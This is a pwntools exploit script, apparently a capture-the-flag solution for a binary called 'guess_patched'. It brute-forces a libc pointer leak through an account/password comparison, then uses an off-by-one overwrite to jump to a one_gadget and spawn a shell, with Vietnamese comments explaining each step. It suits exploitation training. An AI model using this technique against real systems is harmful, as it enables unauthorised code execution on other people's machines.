from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
# breakrva 0xaa9
# breakrva 0xad3
breakrva 0x9aa
continue
'''.format(**locals())

#Binary filename
exe = './guess_patched'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc-2.27.so")

'''
bài này leak được leak libc và dùng one_gadget
- Đoạn có thể leak đc là đoạn so sánh Account và Password khi 2 
đoạn này bằng nhau thì bypass do đó chúng ta bruteForce đoạn Account 
khi nó bằng Password 0x18 byte (0x10 byte junk và 0x8 byte _stderr_) 
và tính được libc
- Sau đó với đoạn Welcome thì i nằm ở vị trí rsp - 0x10 và 
có lỗi off-by-one và ta có thể ghi i = 0x57 sau đó one_gadget 
sẽ nhảy đến vị trí ret của hàm và ghi dè thành công
==> Get shell !!! 
'''
res = b'\x80\xc6'
p.sendlineafter(b"Choice: ", "1")
for i in range(6):
    for j in range(1, 0x100):
        junk = b"a" * 0x10
        p.sendafter(b"Account: ", junk + res + p8(j) + b"\x00")
        p.sendafter(b"Password: ", junk)
        if p.recv(2) == b'We':
            res += p8(j)
            log.info(res)
            p.sendline()
        p.sendlineafter(b"Choice: ", "1")
res = u64(res.ljust(8, b"\x00"))
log.info("leak = " + hex(res))
libc.address = res - 0x3ec680
log.info("libc = " + hex(libc.address))

one_gadget = libc.address + 0x10a45c

p.sendlineafter(b"Account: ", b"a" + b"\x00")
p.sendlineafter(b"Password: ", b"a")
payload = b"a"*0x40 + b"\x57" + p64(one_gadget)
pause()
p.sendlineafter(b"Welcome, Boss. Leave your valuable comments: ", payload)
p.interactive()
